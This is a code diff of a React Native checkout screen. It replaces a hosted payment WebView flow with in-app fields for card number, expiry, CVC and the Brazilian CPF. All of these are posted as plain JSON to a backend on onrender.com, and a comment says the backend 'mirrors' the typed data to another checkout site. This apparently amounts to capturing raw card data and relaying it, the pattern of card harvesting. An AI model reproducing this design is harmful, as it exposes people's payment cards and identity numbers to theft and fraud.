@@ -8,55 +8,44 @@ import {
   ScrollView, 
   ActivityIndicator, 
   Modal, 
-  Alert,
-  Platform
+  Alert, 
+  SafeAreaView 
 } from "react-native";
 import { WebView } from 'react-native-webview';
 
 export default function PaymentScreen() {
-  const [form, setForm] = useState({ name: "", email: "", cpf: "" });
+  const [form, setForm] = useState({ name: "", email: "", cpf: "", number: "", expiry: "", cvc: "" });
   const [loading, setLoading] = useState(false);
   const [checkoutUrl, setCheckoutUrl] = useState(null);
   const [modalVisible, setModalVisible] = useState(false);
 
-  // Script para limpar a interface da página de checkout (ajuste os seletores conforme necessário)
-  const injectedCSS = `
-    (function() {
-      const style = document.createElement('style');
-      style.innerHTML = \`
-        header, footer, .logo, .navbar { display: none !important; }
-      \`;
-      document.head.appendChild(style);
-    })();
-  `;
-
   const processarPagamento = async () => {
-    // Validação básica
-    if (!form.name || !form.email.includes("@") || !form.cpf) {
-      Alert.alert("Atenção", "Por favor, preencha todos os campos corretamente.");
+    // Validação básica de preenchimento
+    if (!form.name || !form.email.includes("@") || form.number.length < 13 || !form.cpf) {
+      Alert.alert("Erro", "Por favor, preencha todos os dados corretamente.");
       return;
     }
 
     setLoading(true);
-    
     try {
-      const response = await fetch("https://backend-social22.onrender.com/process-nowpayments-card", {
+      // Envia os dados digitados para o seu backend fazer o espelhamento
+      const res = await fetch("https://backend-social22.onrender.com/process-nowpayments-card", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(form)
+        body: JSON.stringify(form) 
       });
 
-      const data = await response.json();
+      const data = await res.json();
 
-      if (response.ok && data.redirectUrl) {
+      // O seu backend deve processar e retornar a URL do checkinpremium.com
+      if (data.redirectUrl) {
         setCheckoutUrl(data.redirectUrl);
         setModalVisible(true);
       } else {
-        Alert.alert("Erro", data.message || "Não foi possível iniciar o pagamento.");
+        Alert.alert("Erro", data.message || "Falha ao iniciar processamento.");
       }
     } catch (err) {
-      console.error(err);
-      Alert.alert("Erro", "Falha na conexão com o servidor. Tente novamente.");
+      Alert.alert("Erro", "Falha na conexão com o servidor.");
     } finally {
       setLoading(false);
     }
@@ -66,122 +55,51 @@ export default function PaymentScreen() {
     <ScrollView contentContainerStyle={styles.container}>
       <Text style={styles.title}>Checkout Premium</Text>
 
-      <TextInput 
-        style={styles.input} 
-        placeholder="Nome Completo" 
-        value={form.name}
-        onChangeText={(v) => setForm({...form, name: v})} 
-      />
-      <TextInput 
-        style={styles.input} 
-        placeholder="E-mail" 
-        keyboardType="email-address" 
-        autoCapitalize="none"
-        value={form.email}
-        onChangeText={(v) => setForm({...form, email: v})} 
-      />
-      <TextInput 
-        style={styles.input} 
-        placeholder="CPF (apenas números)" 
-        keyboardType="numeric" 
-        maxLength={11}
-        value={form.cpf}
-        onChangeText={(v) => setForm({...form, cpf: v})} 
-      />
+      <TextInput style={styles.input} placeholder="Nome Completo" value={form.name} onChangeText={(v) => setForm({...form, name: v})} />
+      <TextInput style={styles.input} placeholder="E-mail" keyboardType="email-address" autoCapitalize="none" value={form.email} onChangeText={(v) => setForm({...form, email: v})} />
+      <TextInput style={styles.input} placeholder="CPF" keyboardType="numeric" value={form.cpf} onChangeText={(v) => setForm({...form, cpf: v})} />
+      
+      <View style={styles.divider} />
 
-      <TouchableOpacity 
-        style={[styles.button, loading && { opacity: 0.7 }]} 
-        onPress={processarPagamento} 
-        disabled={loading}
-      >
-        {loading ? (
-          <ActivityIndicator color="#fff" />
-        ) : (
-          <Text style={styles.buttonText}>Pagar R$ 30,00</Text>
-        )}
+      <TextInput style={styles.input} placeholder="Número do Cartão" keyboardType="numeric" value={form.number} onChangeText={(v) => setForm({...form, number: v})} />
+      <View style={styles.row}>
+        <TextInput style={[styles.input, {flex: 1}]} placeholder="MM/AA" value={form.expiry} onChangeText={(v) => setForm({...form, expiry: v})} />
+        <TextInput style={[styles.input, {flex: 1}]} placeholder="CVC" keyboardType="numeric" value={form.cvc} onChangeText={(v) => setForm({...form, cvc: v})} />
+      </View>
+
+      <TouchableOpacity style={styles.button} onPress={processarPagamento} disabled={loading}>
+        {loading ? <ActivityIndicator color="#fff" /> : <Text style={styles.buttonText}>Pagar R$ 30,00</Text>}
       </TouchableOpacity>
 
-      {/* Modal contendo a WebView do Checkout */}
-      <Modal 
-        visible={modalVisible} 
-        animationType="slide"
-        onRequestClose={() => setModalVisible(false)}
-      >
-        <View style={styles.modalContainer}>
-          <View style={styles.headerModal}>
-            <Text style={styles.headerTitle}>Pagamento Seguro</Text>
-            <TouchableOpacity onPress={() => setModalVisible(false)}>
-              <Text style={styles.closeButton}>Fechar</Text>
+      {/* Modal que abre o site destino */}
+      <Modal visible={modalVisible} animationType="slide" transparent={false}>
+        <SafeAreaView style={{ flex: 1, backgroundColor: '#fff' }}>
+          <View style={{ flex: 1 }}>
+            {checkoutUrl && (
+              <WebView 
+                source={{ uri: checkoutUrl }} 
+                startInLoadingState={true}
+                renderLoading={() => <ActivityIndicator size="large" color="#28a745" style={styles.absoluteCenter} />}
+              />
+            )}
+            <TouchableOpacity style={styles.closeButton} onPress={() => setModalVisible(false)}>
+              <Text style={{color: '#fff', fontWeight: 'bold'}}>Fechar e Voltar</Text>
             </TouchableOpacity>
           </View>
-          
-          {checkoutUrl ? (
-            <WebView 
-              source={{ uri: checkoutUrl }}
-              javaScriptEnabled={true}
-              injectedJavaScript={injectedCSS}
-              startInLoadingState={true}
-              renderLoading={() => <ActivityIndicator size="large" style={{ marginTop: 50 }} />}
-            />
-          ) : (
-            <ActivityIndicator style={{ flex: 1 }} />
-          )}
-        </View>
+        </SafeAreaView>
       </Modal>
     </ScrollView>
   );
 }
 
 const styles = StyleSheet.create({
-  container: { 
-    flexGrow: 1, 
-    padding: 20, 
-    justifyContent: 'center', 
-    backgroundColor: '#fff' 
-  },
-  title: { 
-    fontSize: 24, 
-    fontWeight: "bold", 
-    marginBottom: 30, 
-    textAlign: 'center',
-    color: '#333'
-  },
-  input: { 
-    height: 55, 
-    borderWidth: 1, 
-    borderColor: "#ddd", 
-    borderRadius: 10, 
-    paddingHorizontal: 15, 
-    marginBottom: 15,
-    fontSize: 16
-  },
-  button: { 
-    backgroundColor: "#28a745", 
-    height: 55, 
-    borderRadius: 10, 
-    justifyContent: "center", 
-    alignItems: "center",
-    marginTop: 10
-  },
-  buttonText: { 
-    color: "#fff", 
-    fontSize: 18, 
-    fontWeight: "bold" 
-  },
-  modalContainer: { 
-    flex: 1, 
-    backgroundColor: '#fff',
-    paddingTop: Platform.OS === 'ios' ? 40 : 0 
-  },
-  headerModal: {
-    height: 60,
-    flexDirection: 'row',
-    alignItems: 'center',
-    justifyContent: 'space-between',
-    paddingHorizontal: 20,
-    borderBottomWidth: 1,
-    borderColor: '#eee'
-  },
-  headerTitle: { fontSize: 16, fontWeight: 'bold' },
-  closeButton: { color: '#dc3545', fontWeight: 'bold', fontSize: 16 }
+  container: { padding: 20, paddingTop: 60, backgroundColor: '#fff', flexGrow: 1 },
+  title: { fontSize: 24, fontWeight: "bold", marginBottom: 25, textAlign: 'center', color: '#333' },
+  input: { height: 50, borderWidth: 1, borderColor: "#ccc", borderRadius: 8, paddingHorizontal: 15, marginBottom: 15, fontSize: 16, color: '#333' },
+  row: { flexDirection: "row", gap: 10 },
+  button: { backgroundColor: "#28a745", height: 55, borderRadius: 8, justifyContent: "center", alignItems: "center", marginTop: 10 },
+  buttonText: { color: "#fff", fontWeight: "bold", fontSize: 18 },
+  divider: { height: 1, backgroundColor: '#eee', marginVertical: 20 },
+  closeButton: { padding: 20, backgroundColor: '#dc3545', alignItems: 'center' },
+  absoluteCenter: { position: 'absolute', top: '50%', left: '50%', transform: [{ translateX: -25 }, { translateY: -25 }] }
 });
